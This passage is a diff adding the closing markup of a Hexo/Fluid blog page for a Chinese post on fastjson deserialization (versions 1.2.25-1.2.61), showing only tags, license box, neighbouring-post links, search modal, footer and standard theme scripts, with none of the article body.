+      <span class="category-chain">
+        
+  <a href="/categories/java%E5%AE%89%E5%85%A8/" class="category-chain-item">java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/java%E5%AE%89%E5%85%A8/" class="print-no-link">#java安全</a>
+      
+        <a href="/tags/fastjson/" class="print-no-link">#fastjson</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>fastjson 反序列化基础二(1.2.25-1.2.61)</div>
+      <div>https://pow1e.github.io/2024/04/28/漏洞中间件复现/fastjson/fastjson 1225-1261/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>pow1e</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年4月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/04/29/%E6%BC%8F%E6%B4%9E%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%A4%8D%E7%8E%B0/fastjson/fastjson%201262-1268/" title="fastjson 反序列化基础三(1.2.62-1.2.68)">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">fastjson 反序列化基础三(1.2.62-1.2.68)</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/26/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Ruoyi%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="Ruoyi代码审计">
+                        <span class="hidden-mobile">Ruoyi代码审计</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
